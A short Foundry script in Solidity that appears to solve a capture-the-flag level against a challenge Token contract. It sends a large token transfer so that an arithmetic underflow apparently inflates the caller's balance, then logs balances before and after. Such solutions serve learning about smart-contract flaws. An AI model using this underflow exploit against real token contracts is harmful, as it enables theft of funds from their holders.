// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Token.sol";

contract Level5Solution is Script
{

    address public ttk = 0x4110c2CCa4C316bDf5DB0F48E0eeD99CC82A7D9a;

Token public token = Token(ttk);

function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
       
        //console.log("0 balance before  ",address(0).balance);
        console.log("my balance before ",token.balanceOf(vm.envAddress("MY_ADDRESS")));
        console.log(" balance after  ",token.balanceOf(ttk));

        //new send(token);
        token.transfer(ttk, 10000 ether);

        //console.log("my balance after  ",address(0).balance);
        console.log("my balance after  ",token.balanceOf(vm.envAddress("MY_ADDRESS")));
        console.log(" balance after  ",token.balanceOf(ttk));
                
        vm.stopBroadcast();
    }

}
